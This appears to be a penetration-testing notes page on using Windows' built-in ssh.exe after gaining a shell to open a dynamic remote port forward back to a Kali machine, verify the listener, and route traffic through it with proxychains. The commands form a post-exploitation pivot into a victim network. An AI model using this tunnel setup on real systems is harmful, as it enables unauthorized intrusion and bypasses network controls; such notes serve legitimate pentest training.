---
description: >-
  sss.exe now comes preinstalled on all Windows systems starting with Windows
  10.
---

# ssh.exe

We will find:  **scp.exe**, **sftp.exe**, **ssh.exe at: %systemdrive%\Windows\System32\OpenSSH** location by default.

It's worth looking for ssh when popping a shell, though administrators may prevent SSH on their machines.

## Basic Usage - Dynamic Remote Port Forward

### Setup Dynamic Remote Port Forward

```
C:\Users\rdp_admin\.ssh>ssh -N -R 9998 kali@192.168.45.185
```

### Verify Remote Port Forward:

<pre><code><strong>kali@kali$ ss -nltpu
</strong>Netid         State          Recv-Q         Send-Q                 Local Address:Port                    Peer Address:Port         Process         
udp           UNCONN         0              0                            0.0.0.0:33181                        0.0.0.0:*                            
tcp           LISTEN         0              128                        127.0.0.1:9998                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:22                           0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:22                              [::]:*                            
tcp           LISTEN         0              128                            [::1]:9998                            [::]:*             
</code></pre>

### Configure Proxychains

```
kali@kali$ tail -f /etc/proxychains4.conf 
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 9998

```
